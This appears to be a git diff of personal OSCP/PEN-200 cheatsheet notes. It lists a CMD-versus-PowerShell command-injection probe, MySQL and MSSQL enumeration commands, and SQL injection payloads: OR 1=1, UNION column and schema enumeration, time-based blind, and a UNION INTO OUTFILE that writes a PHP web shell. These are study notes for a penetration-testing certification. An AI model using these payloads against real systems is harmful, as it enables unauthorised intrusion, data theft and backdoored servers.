@@ -1,7 +1,11 @@
 # OSCP-Notes
 Cheatsheet/Notes from PEN-200 Learning Platform for the OSCP Exam
+file metadata analyzer:
+
+    exiftool -a -u <file.name>
+  
 Web App Pentest
-  D
+
     Command Injection
       Check if CMD or PowerShell we have:
         (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
@@ -12,35 +16,44 @@ Web App Pentest
   SQLi
     MySQL:
       connect to mysql remotely:
+      
         mysql -u <user> -h <ip> -P 3306 -p;
-      commands after connection:
+        
+  commands after connection:
+      
         show databases;
         select version();
         show tables in mysql;
         select * from mysql.user;
         select * from mysql.user where user = 'username';
-    MSSQL:
+        
+  MSSQL:
       connect:
+      
         impacket-mssqlclient <user>:<pass>@<ip> -windows-auth
-      commnads:
+  commnads:
+  
         select @@version;
         select name from sys.databases;
         select * from <db_name>.information_schema.tables;
         select * from master.dbo.sysusers;
 
-    Injections: 
+  Injections: 
+  
       offsec' OR 1=1 -- //
       if above successful:
             ' or 1=1 in (select @@version) -- //
-    UNION injections:
+            
+  UNION injections:
       first get number of columns (increase number by 1):
+      
         ' ORDER BY 1-- //
         ' UNION SELECT null, null, database(), user(), @@version  -- //
         ' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
       shell with Union
         ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
 
-    Time Based Blind SQL:
+  Time Based Blind SQL:
       ' AND IF (1=1, sleep(3),'false') -- //
 
 
